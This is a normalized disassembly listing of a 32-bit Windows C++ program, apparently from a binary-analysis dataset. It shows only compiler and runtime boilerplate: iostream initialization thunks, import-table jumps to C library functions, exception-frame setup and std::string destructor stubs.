sub_401015
push ??1Init@ios_base@std@@QAE@XZ
call sub_40211c
pop ecx
retn
??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_40102c
call ??0_Winit@std@@QAE@XZ
jmp sub_401041
??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_401041
push ??1_Winit@std@@QAE@XZ
call sub_40211c
pop ecx
retn
??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
sub_401577
mov eax [ ebp - 0x38 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax r-xdata
retn
cmp [ eax ] bl
je r-xdata
call [ GetLastError@IAT ]
sub_4016a5
retn
sub_4016a6
push [ esp + 0x4 ]
call sub_4016a5
pop ecx
xor eax eax
retn 0x4
sub_4020f0
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_40211c
push [ esp + 0x4 ]
call sub_4020f0
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_40212e
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
strlen
jmp [ strlen@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
memset
jmp [ memset@IAT ]
strcmp
jmp [ strcmp@IAT ]
strcat
jmp [ strcat@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_402170
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_402312
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_402324
xor eax eax
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_402334
mov eax r--data
jmp __CxxFrameHandler
sub_402340
lea ecx [ ebp - 0x9c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40234c
lea ecx [ ebp - 0x8c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402358
lea ecx [ ebp - 0x7c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402361
lea ecx [ ebp - 0xac ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40236d
lea ecx [ ebp - 0xac ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402379
mov eax r--data
jmp __CxxFrameHandler
